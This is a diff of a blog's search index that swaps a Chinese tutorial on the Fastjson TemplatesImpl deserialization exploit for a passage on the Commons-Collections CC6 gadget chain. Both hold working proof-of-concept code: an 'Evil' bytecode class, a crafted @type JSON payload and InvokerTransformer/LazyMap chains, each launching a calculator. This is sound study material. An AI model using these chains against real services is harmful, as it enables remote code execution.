@@ -1,205 +1,288 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Fastjson_TemplatesImpl</title>
-    <url>/2025/03/13/Fastjson-TemplatesImpl/</url>
-    <content><![CDATA[<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>这里利用的了TemplatesImpl的类，可以联想到CC3里面利用方式，将TemplatesImpl这个类，实例化的时候传入我们的恶意字节码，然后他会将我们的恶意字节码当成类去实例化然后调用静态方法。</p>
-<p><strong>这里先教大家怎么转换恶意类的字节码，原因是网上很多都是已经写好的poc，那他的恶意类执行的方法就是Runtime.getRuntime.exec(“calc”) ，这个如果是windows系统就可以正常执行命令，但是如果是我们的mac系统呢。我们弹出计算器需要的命令是 open -a Calculator ,所以我们就需要去修改恶意类里面的字节码，以后我们学习的时候也方便许多</strong> </p>
-<h3 id="class文件转换为字节码"><a href="#class文件转换为字节码" class="headerlink" title="class文件转换为字节码"></a>class文件转换为字节码</h3><h4 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil extends AbstractTranslet &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>这里面恶意类继承了AbstractTranslet类，此时可以带着疑问看一下，CC3的时候也有了解</p>
-<img  
+    <title>CC6反序列化链</title>
+    <url>/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
+    <content><![CDATA[<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/1732247379749-eb615db2-03fa-46b9-9f18-360b5dfbac6c.png"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732217521294-561919d4-5333-40a4-b10e-3769df62eb9b.png"
                       class=""
                 > 
 
-<p>可以先看这张图，就是告诉我们为什么要继承AbstractTranslet</p>
-<h3 id="类转换为字节码"><a href="#类转换为字节码" class="headerlink" title="类转换为字节码"></a>类转换为字节码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Read_class_bytes &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        byte[] bytes = Files.readAllBytes(Paths.get(&quot;target/classes/Evil.class&quot;));</span><br><span class="line">        System.out.println(new String(bytes));</span><br><span class="line">        System.out.println(&quot;------------------------------------------------------------------------------------------------------------&quot;);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>记住这里路径读取的是target目录下的class</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313174419129.png"
-                      class="" title="image-20250313174419129"
-                > 
-
-<p><em>这里为什么要用到base64去编码我们的字节码呢，我们先参考文章来看，然后在调试中看看是不是这么回事</em> </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313175436060.png"
-                      class="" title="image-20250313175436060"
-                > 
-
-<p>看一下代码里面</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313175506767.png"
-                      class="" title="image-20250313175506767"
-                > 
-
-<p>如果我们的lexer为JSONScanner的话</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313175546681.png"
-                      class="" title="image-20250313175546681"
-                > 
-
-<p>就会调用它的bytesValue，所以就会进行base64解码</p>
-<p>这只是初步了解，实际情况我们以调试为准。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
-<li>创建一个maven项目</li>
-<li>准备一个恶意类和一个漏洞利用的代码</li>
-<li>maven配置fastjson版本，JDK我是高版本一样可以执行命令</li>
-</ul>
-<p>maven配置</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>漏洞利用代码</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Fastjson_TemplatesImpl &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        ParserConfig config = new ParserConfig();</span><br><span class="line">        byte[] bytes = Files.readAllBytes(Paths.get(&quot;target/classes/Evil.class&quot;));</span><br><span class="line">        String base64EncodedBytes = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        String text = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot; + base64EncodedBytes + &quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;;</span><br><span class="line">        JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>初步运行在代码</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313180130091.png"
-                      class="" title="image-20250313180130091"
-                > 
-
-<p>这里代码为什么要<em>JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</em> 搞那么复杂</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313180240134.png"
-                      class="" title="image-20250313180240134"
-                > 
-
-<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p><strong>fastjson反序列化漏洞的利用方式从JdbcRowSetImpl可以看出就是他会实例化我们指定的对象，然后调用getter或者setter方法</strong> 网上大部分的文章都直接分析一些特殊的点，但是我们不知道TemplatesImpl里面会走哪些函数，就是怎么走的。</p>
-<h3 id="猜测分析"><a href="#猜测分析" class="headerlink" title="猜测分析"></a>猜测分析</h3><p>从实例化的时候会调用getter或者setter方法，以及初始化的无参构造函数看看</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184436063.png"
-                      class="" title="image-20250313184436063"
-                > 
-
-<p>无参构造函数，可以打上断点看看会不会走到这，这里给_bytecodes我们的恶意字节码赋值了哦</p>
-<p>然后从CC3的链子可知漏洞触发的点是这个函数definclass</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184542985.png"
-                      class="" title="image-20250313184542985"
-                > 
-
-<p>也可以打上断点</p>
-<p><strong>找哪里调用了defineClass</strong> </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184634203.png"
-                      class="" title="image-20250313184634203"
-                > 
-
-<p>那我们就要找defineTransletClasses  <strong>一层一层往上找原因是肯定有一个setter方法或者getter方法里面一步一步调用这些函数到触发漏洞点的</strong> </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184749244.png"
-                      class="" title="image-20250313184749244"
-                > 
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190343258.png"
-                      class="" title="image-20250313190343258"
-                > 
-
-<p>这里有三个，都可以打上断点，都是get方法。所以我们可以调试一下了</p>
-<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>TemplatesImpl这个类里面的方法</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190545878.png"
-                      class="" title="image-20250313190545878"
-                > 
-
-<p>跟进newTransformer()</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190634787.png"
-                      class="" title="image-20250313190634787"
-                > 
-
-<p>跟进getTransletInstance()</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190714628.png"
-                      class="" title="image-20250313190714628"
-                > 
-
-<p>getTransletInstance 这个方法里面有defineTransletClasses，这里面可以知道我们想要进入defineTransletClasses，我们就需要满足</p>
+<p>CC6底层用的也是invokertransformer的transform去进行命令执行</p>
+<p>然后用的是lazymap这条链子</p>
 <ul>
-<li>_name!&#x3D;null</li>
-<li>_class&#x3D;&#x3D;null</li>
+<li><p>利用的依赖</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div></li>
 </ul>
+<h2 id="底层出口LazyMap-InvokerTransformer"><a href="#底层出口LazyMap-InvokerTransformer" class="headerlink" title="底层出口LazyMap+InvokerTransformer"></a>底层出口LazyMap+InvokerTransformer</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class CC6_1 &#123;</span><br><span class="line">    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        //初始化InvokerTransformer</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(hashMap, invokerTransformer);</span><br><span class="line">        //利用LazyMap的decorate去初始化LazyMap内部的factory，然后get函数里面存在factory.transfer()</span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Method lazyGetMethod = lazyMapClass.getDeclaredMethod(&quot;get&quot;, Object.class);</span><br><span class="line">        lazyGetMethod.setAccessible(true);</span><br><span class="line">        //让get函数可以被直接操作</span><br><span class="line">        lazyGetMethod.invoke(decorateMap, runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们顺着代码来吧</p>
+<h4 id="InvokerTransformer初始化-利用方式"><a href="#InvokerTransformer初始化-利用方式" class="headerlink" title="InvokerTransformer初始化+利用方式"></a>InvokerTransformer初始化+利用方式</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184143397-2a3dd1e4-5620-4b58-a911-cfd8ba39d109.png"
+                      class="" title="img"
+                > 
+
+<p>我们查看InvokerTransformer这个类</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190821863.png"
-                      class="" title="image-20250313190821863"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184234521-97287f70-915b-433f-85e9-3bbc62f8ed65.png"
+                      class="" title="img"
                 > 
 
-<p>这里可以知道我们的_bytecodes就是恶意字节码不能为null</p>
+<p>里面存在这个初始化函数，这里面的参数已经够我们想到如果有地方可以invoke调用就可以造成rce了</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190947571.png"
-                      class="" title="image-20250313190947571"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184279009-bcc5128e-fae0-4eed-befd-325c69d52140.png"
+                      class="" title="img"
                 > 
 
-<p>然后就走到我们加载恶意类的地方</p>
+<p>这里还真的有，并且input参数是我们传入的，传入个Runtime对象就可以实现RCE了</p>
+<h4 id="LazyMap初始化以及利用"><a href="#LazyMap初始化以及利用" class="headerlink" title="LazyMap初始化以及利用"></a>LazyMap初始化以及利用</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184381641-a533fdb3-f0f7-454f-8ab3-e526270c984b.png"
+                      class="" title="img"
+                > 
+
+<p>我们查看下LazyMap的decorate函数</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313191045652.png"
-                      class="" title="image-20250313191045652"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184447459-a8fe7ba8-4dcb-4331-b098-0e971bfdcb74.png"
+                      class="" title="img"
                 > 
 
-<p>走到我们的恶意类调用静态方法。</p>
-<h3 id="分析poc"><a href="#分析poc" class="headerlink" title="分析poc"></a>分析poc</h3><img  
+<p>因为LazyMap下面那个构造函数是protected所以我们无法直接利用，所以利用public的decorate函数去初始化，重点是这一行<strong>this.factory &#x3D; FactoryTransformer.getInstance(factory);</strong> </p>
+<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313192102984.png"
-                      class="" title="image-20250313192102984"
-                > 
-
-<ul>
-<li>@type，是为了实例化TemplatesImpl这个函数并且调用它的类函数</li>
-<li>_bytecodes是放恶意字节码让我们后面可以defineclass(_bytecodes)，加载恶意类</li>
-<li>_name 是上面为了绕过if判断，if为空就不进那个判断语句</li>
-<li>_tfactory是为了能让代码继续走下去不会报错<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/Fastjson-TemplatesImpl/1732247023186-6249d5fc-fbbb-491a-9123-2fd4265bb436-20250313192358337.png"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184508030-ef78abb4-0ba4-427d-9b02-d009efbd1580.png"
                       class=""
-                > </li>
-<li>_outputProperties这个属性就是为了反序列化的时候自动调用getter方法，他会拼接get+outputProperties&#x3D;getoutputProperties的方法进行调用，从而执行我们的利用链</li>
+                > 
+
+<p>可以看到factory也是transformer类型，并且它初始化赋值了，所以我们让factory为invokerTransformer的对象</p>
+<p>那我们这时候是不是就只缺一个哪个地方让这个对象**.transfer** 的地方了</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184684820-8cfb7640-6f51-4e9d-a0d8-aec9c8f778cf.png"
+                      class="" title="img"
+                > 
+
+<p>LazyMap里面的get函数，factory我们初始化为invokerTransformer的对象了，那他再transofrmer，并且key我们可控，传一个Runtime对象是不是就可以了</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184778636-62da0f9a-06d9-4b27-ac08-8639fd7e6dab.png"
+                      class="" title="img"
+                > 
+
+<h2 id="TiedMapEntry去调用LazyMap的get函数"><a href="#TiedMapEntry去调用LazyMap的get函数" class="headerlink" title="TiedMapEntry去调用LazyMap的get函数"></a>TiedMapEntry去调用LazyMap的get函数</h2><h3 id="getValue分析"><a href="#getValue分析" class="headerlink" title="getValue分析"></a>getValue分析</h3><p>因为我们需要找到一个地方是可以readobject里面调用get并且参数和对象可控的，但是没有找到适配的，所以我们就要再往上找</p>
+<p>某某函数-&gt;LazyMap.get()</p>
+<p>依据ysoSerial链子找到了TiedMapEntry</p>
+<p>我们自己审一下先，这个类哪里可以调用get，并且参数是否可控</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184993706-a24e292b-c7eb-40db-840f-6d544d9288b7.png"
+                      class="" title="img"
+                > 
+
+<p>看到他的getValue函数，他是map.get(key)</p>
+<p>如果map可以为LazyMap，我们初始化他的factory对象为InvokerTransformer对象</p>
+<p>然后LazyMap调用get是不是就是上面的</p>
+<p>factory.transfer(key) &#x3D;&#x3D; InvokerTransformer.transfer(key)</p>
+<p>那如果key可控为Runtime.class呢</p>
+<p>factory.transfer(runtime) &#x3D;&#x3D; InvokerTransformer.transfer(runtime)</p>
+<p>就实现RCE了</p>
+<p>去看看TiedMapEntry含有什么参数并且怎么实例化的</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185253051-d272f369-f8d6-4d91-8cfb-fed77ce2eeca.png"
+                      class="" title="img"
+                > 
+
+<p>可以看出他可以序列化这个TiedMapEntry</p>
+<p>然后map也是Map对象，LazyMap是Map的子类，所以二者其实一样的</p>
+<p>Object可以是个对象，那就是刚好如果可控给他一个Runtime对象</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185336849-ce7efe4e-dc9f-44b4-b53c-b22911b9e6cb.png"
+                      class="" title="img"
+                > 
+
+<p>实例化不仅是public而且两个特别需要的参数都是可控的 </p>
+<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC6_2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //TiedMapEntry 里面存在get函数的调用，我们可以用它来调用lazymap</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        //实例化Runtime对象</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        //实例化InvokerTransformer对象</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(hashmap,invokerTransformer);</span><br><span class="line">        //实例化LazyMap对象</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap,runtime);</span><br><span class="line">        //实例化TiedMapEntry对象</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line">        //getValue函数为public，直接调用</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>真的很简单写下来就会发现</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185886275-80fcbeac-6e3b-411a-aa65-c74ca0b26aa2.png"
+                      class="" title="img"
+                > 
+
+<h3 id="hashCode分析"><a href="#hashCode分析" class="headerlink" title="hashCode分析"></a>hashCode分析</h3><p>因为这个类本身没有自定义的序列化和反序列化函数，所以还得找，我们找哪里的函数调用了getvalue并且看看参数可控不可控</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186113991-1fef0431-e82e-4834-98f2-77470cadfcdf.png"
+                      class="" title="img"
+                > 
+
+<p>时发现它本身的hashCode调用了getValue，此时因为是他自身的，所以hashCode并不需要参数可控，能直接调用就行了</p>
+<p>也写一下代码吧</p>
+<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186224096-1f5e6d40-2bce-4ccd-9d4c-06f5256bdcd4.png"
+                      class="" title="img"
+                >
+
+<p>算了，太懒了不写了，发现其实就是把getvalue换成了hashCode，因为hashCode里面会调用getValue，本质上一样</p>
+<p>其实这里也可以想想入口怎么样很完美了</p>
+<p>因为如果有个readObject里面hashMap.hashCode()，那就直接完成链子了</p>
+<h2 id="HashMap的hashCode方法"><a href="#HashMap的hashCode方法" class="headerlink" title="HashMap的hashCode方法"></a>HashMap的hashCode方法</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我们查看下HashMap的类</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186462197-d2363a51-a6ce-4fcb-8ce8-69fbec970487.png"
+                      class="" title="img"
+                >
+
+<p>可以序列化和反序列化</p>
+<p>这里其实跟URL利用hashmap反序列化连起来了</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186598740-daa1c4ac-8397-461f-b59d-79e24f9bcd81.png"
+                      class="" title="img"
+                >
+
+<p>put里面有个hash(key)函数的调用，我们再深入一步看看</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186642224-70347f1b-0bcc-4f6c-889b-546e2e9cd40e.png"
+                      class="" title="img"
+                >
+
+<p>直接就看到hashCode</p>
+<p>并且key.hashCode()，key还可控啊</p>
+<p>我们观察下他的反序列化readObject</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186743782-82c1870a-770b-423f-a649-373e983edeaf.png"
+                      class="" title="img"
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186811484-b13033d9-1c5f-4c8f-9c28-e69d83a65246.png"
+                      class="" title="img"
+                > 
+
+<p>所以其实我们都不用put函数，readObject里面就自己会调用hash(key)，key如果可控就直接完成了链子了</p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
+<li><p>1、Runtime没有办法序列化和反序列化，所以我们需要利用反射，就需要CC1里面的递归调用transform疯狂进行invoke，然后实例化出一个Runtime对象，然后再命令执行</p>
+</li>
+<li><p>2、put里面也会有hash(key)，所以序列化的时候就会弹一次计算器，所以我们可以put的时候让key是个没啥用的东西，之后利用反射再把值修改好</p>
+</li>
+<li><p>3、因为后面我们用了hash，LazyMap作为键值，所以这里会出现判断他的key是否存在，不存在才会执行transform，所以我们需要把它的key给删掉</p>
+</li>
 </ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732191324913-42f0aa79-f8a5-4629-9267-2bb5ef4b7da0.png"
+                      class="" title="img"
+                > 
+
+<p>这里的原因是IDEA debug时会调用toString方法，但是CC5中就是利用的toString链子，就是说它会走到lazyMap的get函数那里</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732217866498-7fc86c27-338e-4795-9539-2faef1e29e69.png"
+                      class="" title="img"
+                > 
+
+<p>所以此时我们lazymap的key是null，虽然进去了if，但是factory没有变成我们命令执行所需要的东西**（因为put的时候会造成反序列化RCE，所以我们不想要put的时候就被调用，在put后通过反射再修改）** ，所以没有作用，然后执行map.get(key)，将key值传进去了，而key值是我们传给TiedMapEntry的</p>
+<p>因为TiedMapEntry.getValue() -&gt; map.get(key)</p>
+<p>map为LazyMap对象，key是我们传入给TiedMapEntry的值</p>
+<h3 id="大概流程"><a href="#大概流程" class="headerlink" title="大概流程"></a>大概流程</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218025778-dd0e767e-581c-4b72-9102-b6371c831a8e.png"
+                      class="" title="img"
+                > 
+
+<p>然后debug会调用toString</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218115401-3944a040-d484-4fa3-b257-0cecc3840a61.png"
+                      class="" title="img"
+                > 
+
+<p>toString调用getValue</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218137120-fbe32afe-9dd5-496f-bd16-b84456732c2c.png"
+                      class="" title="img"
+                > 
+
+<p>map是我们传入的LazyMap对象</p>
+<p>后一步是LazyMap的get(key)函数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218195747-7a1988f4-d56b-49a8-bc5f-5d92728864be.png"
+                      class="" title="img"
+                > 
+
+<p>此时虽然进去了if但是factory不是我们命令执行所需要的对象，所以没什么作用，然后就会造成给map.get(key);，给LazyMap的key赋值</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218406941-53298b35-2662-41e3-9741-cca0cc80e249.png"
+                      class="" title="img"
+                > 
+
+<p>后续我们修改LazyMap的factory对象可以造成命令执行，但是LazyMap的key已经变成传入的2了，所以就进入不了这个if </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
